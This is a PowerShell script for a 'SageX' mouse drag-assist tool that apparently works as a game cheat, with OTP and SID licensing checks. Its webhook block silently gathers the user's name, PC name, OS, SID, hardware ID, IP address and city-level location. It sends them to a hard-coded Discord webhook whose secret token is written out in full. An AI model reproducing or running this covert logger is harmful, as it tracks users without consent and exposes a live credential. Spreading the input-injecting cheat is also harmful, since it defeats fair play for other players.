Clear-Host

# ==================== OTP VERIFICATION SYSTEM ====================
function Get-MachineFingerprint {
    try {
        $cpuId = (Get-WmiObject Win32_Processor -ErrorAction Stop).ProcessorId
        $biosId = (Get-WmiObject Win32_BIOS -ErrorAction Stop).SerialNumber
        $diskId = (Get-WmiObject Win32_DiskDrive -ErrorAction Stop).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction Stop | 
                      Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
        
        $combinedId = "$cpuId$biosId$diskId$macAddress"
        $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($combinedId))
        $hashedId = [System.BitConverter]::ToString($hash) -replace "-", ""
        
        return $hashedId.Substring(0, 32)
    }
    catch {
        Write-Host "[!] Error generating machine fingerprint: $_" -ForegroundColor Red
        exit
    }
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    try {
        $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $bytes = New-Object byte[]($Length)
        $rng.GetBytes($bytes)
        
        $otp = -join ($bytes | ForEach-Object {
            $validChars[$_ % $validChars.Length]
        })
        
        return $otp
    }
    catch {
        Write-Host "[!] Error generating OTP: $_" -ForegroundColor Red
        exit
    }
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            Write-Host "[!] Empty OTP database received" -ForegroundColor Red
            return $false
        }
        
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        return ($remoteData -match $pattern)
    }
    catch {
        Write-Host "[!] Failed to verify OTP: $_" -ForegroundColor Red
        return $false
    }
}

function Initialize-OTPSystem {
    try {
        $appDataFolder = "$env:APPDATA\SageX Regedit"
        if (-not (Test-Path $appDataFolder)) {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        
        $LocalStoragePath = "$appDataFolder\otp.ini"
        $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
        $machineFingerprint = Get-MachineFingerprint
        
        if (Test-Path $LocalStoragePath) {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            if (-not (Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL)) {
                Write-Host "`n[!] Device not authorized. Please contact support." -ForegroundColor Red
                Write-Host "[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
                Write-Host "[!] OTP: $localOTP" -ForegroundColor Cyan
                Start-Sleep 15
                exit
            }
            
            return $true
        }
        else {
            $newOTP = Generate-SecureOTP -Length 12
            $otpContent = @(
                "[OTP]",
                "fingerprint=$machineFingerprint",
                "otp=$newOTP",
                "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            )
            
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            Write-Host "`n[!] FIRST-TIME SETUP REQUIRED" -ForegroundColor Yellow
            Write-Host "=============================================" -ForegroundColor Cyan
            Write-Host "[!] Please register this device with the following information:" -ForegroundColor Cyan
            Write-Host "`n[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
            Write-Host "[!] OTP: $newOTP" -ForegroundColor Green
            Write-Host "`n[!] Send this information to the developer" -ForegroundColor Cyan
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Red
            Start-Sleep 10
            exit
        }
    }
    catch {
        Write-Host "[!] OTP System Error: $_" -ForegroundColor Red
        exit
    }
}

# ==================== MAIN SCRIPT ====================
Initialize-OTPSystem
Clear-Host

# ASCII Art with colors
$asciiArt = @'
  _________                     ____  ___ __________                         .___.__  __   
 /   _____/____     ____   ____ \   \/  / \______   \ ____   ____   ____   __| _/|__|/  |_ 
 \_____  \\__  \   / ___\_/ __ \ \     /   |       _// __ \ / ___\_/ __ \ / __ | |  \   __\
 /        \/ __ \_/ /_/  >  ___/ /     \   |    |   \  ___// /_/  >  ___// /_/ | |  ||  |  
/_______  (____  /\___  / \___  >___/\  \  |____|_  /\___  >___  / \___  >____ | |__||__|  
        \/     \//_____/      \/      \_/         \/     \/_____/      \/     \/             
'@

$asciiArt -split "`n" | ForEach-Object {
    Write-Host $_ -ForegroundColor (Get-Random @("Red", "Yellow", "Cyan", "Green", "Magenta", "Blue", "White"))
}

# Get SID with error handling
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    exit
}

# ==================== WEBHOOK BLOCK ====================
$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"

try {
    $user = $env:USERNAME
    $pcName = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct -ErrorAction Stop).UUID
    $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
        $ip = $ipInfo.query
        $country = $ipInfo.country
        $region = $ipInfo.regionName
        $city = $ipInfo.city
    }
    catch {
        $ip = "Unavailable"
        $country = "Unavailable"
        $region = "Unavailable"
        $city = "Unavailable"
    }

    $embed = @{
        title = "SageX Executed"
        color = 16711680
        timestamp = (Get-Date).ToString("o")
        fields = @(
            @{ name = "User"; value = $user; inline = $true },
            @{ name = "PC Name"; value = $pcName; inline = $true },
            @{ name = "OS"; value = $os; inline = $false },
            @{ name = "SID"; value = $sid; inline = $false },
            @{ name = "HWID (hashed)"; value = $hashedHWID; inline = $false },
            @{ name = "IP Address"; value = $ip; inline = $true },
            @{ name = "Location"; value = "$city, $region, $country"; inline = $true },
            @{ name = "Time"; value = $time; inline = $false }
        )
    }

    $payload = @{
        username = "SageX Logger"
        embeds = @($embed)
    } | ConvertTo-Json -Depth 10

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
}
catch {
    Write-Host "[!] Webhook Error: $_" -ForegroundColor DarkYellow
}

# ==================== HWID VERIFICATION ====================
try {
    $authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/main/HWID"
    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing -ErrorAction Stop
    
    if ([string]::IsNullOrEmpty($rawData)) {
        throw "Empty HWID database received"
    }
    
    if ($rawData -notmatch $sid) {
        Write-Host "`n[!] Unauthorized access detected!" -ForegroundColor Red
        Write-Host "[!] Your SID was not found in the authorized database" -ForegroundColor Yellow
        Start-Sleep 5
        exit
    }
}
catch {
    Write-Host "`n[!] HWID Verification Error: $_" -ForegroundColor Red
    exit
}

# ==================== DRAG ASSIST IMPLEMENTATION ====================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class SageXDragAssist {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }

    public static bool Enabled = true;
    public static int Strength = 6;
    public static int Smoothness = 5;
    public static int AssistLevel = 7;

    public static void Run() {
        POINT prev;
        GetCursorPos(out prev);
        bool isHolding = false;
        DateTime pressStart = DateTime.MinValue;

        while (true) {
            Thread.Sleep(5);

            // Handle key presses
            if ((GetAsyncKeyState(0x76) & 0x8000) != 0) {  // F7
                Enabled = !Enabled;
                Thread.Sleep(200);
            }

            if (!Enabled) continue;

            bool lmbDown = (GetAsyncKeyState(0x01) & 0x8000) != 0;

            if (lmbDown) {
                if (!isHolding) {
                    isHolding = true;
                    pressStart = DateTime.Now;
                } 
                else if ((DateTime.Now - pressStart).TotalMilliseconds >= (100 - (Smoothness * 7))) {
                    POINT curr;
                    GetCursorPos(out curr);

                    int deltaY = curr.Y - prev.Y;
                    int deltaX = curr.X - prev.X;

                    if (deltaY < -1) {
                        double strengthFactor = 0.2 + (Strength * 0.06);
                        double assistFactor = 0.3 + (AssistLevel * 0.05);
                        
                        int correctedX = (int)(deltaX * (strengthFactor * 0.7));
                        int correctedY = (int)(deltaY * strengthFactor * -assistFactor);

                        int steps = 1 + (int)(Smoothness * 0.5);
                        for (int i = 0; i < steps; i++) {
                            mouse_event(0x0001, correctedX / steps, correctedY / steps, 0, 0);
                            Thread.Sleep(5);
                        }
                    }
                    prev = curr;
                }
            } 
            else {
                isHolding = false;
            }
        }
    }
}
"@

# Display initial status
Write-Host "`n[+] AI-Powered Drag Assist Initialized" -ForegroundColor Green
Write-Host "[+] Press F7 to toggle ON/OFF" -ForegroundColor Cyan
Write-Host "[+] Current Status: ACTIVE" -ForegroundColor Green

# Start the drag assist
[SageXDragAssist]::Run()
